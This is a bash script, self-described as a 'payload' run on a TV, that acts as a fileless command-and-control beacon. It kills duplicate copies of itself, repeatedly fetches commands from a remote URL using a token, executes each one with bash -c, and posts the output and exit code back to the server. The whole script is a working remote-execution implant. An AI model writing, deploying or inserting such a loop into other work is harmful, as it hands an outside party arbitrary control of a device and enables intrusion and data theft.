#!/usr/bin/env bash
# Payload the TV runs as a background loop (started via `bash -c`, never as a file).
# __TOKEN__ and __URL__ are substituted at start time by tv-agent-start; a leftover
# placeholder means the substitution did not run, and the loop would poll nothing.
T=__TOKEN__; U=__URL__
# Kill any earlier instance (retried acquisitions can spawn duplicates), never self.
for p in $(pgrep -f "U=__URL__"); do
  [ "$p" != "$$" ] && kill "$p" 2>/dev/null
done
while :; do
  R=$(curl -s -m 8 "$U/cmd?t=$T")
  if [ -n "$R" ]; then
    I=${R%%$'\n'*}; C=${R#*$'\n'}
    O=$(bash -c "$C" 2>&1); RC=$?
    curl -s -m 20 -X POST --data-binary "$O" "$U/out?t=$T&rc=$RC&id=$I" >/dev/null 2>&1
  else
    sleep 1
  fi
done
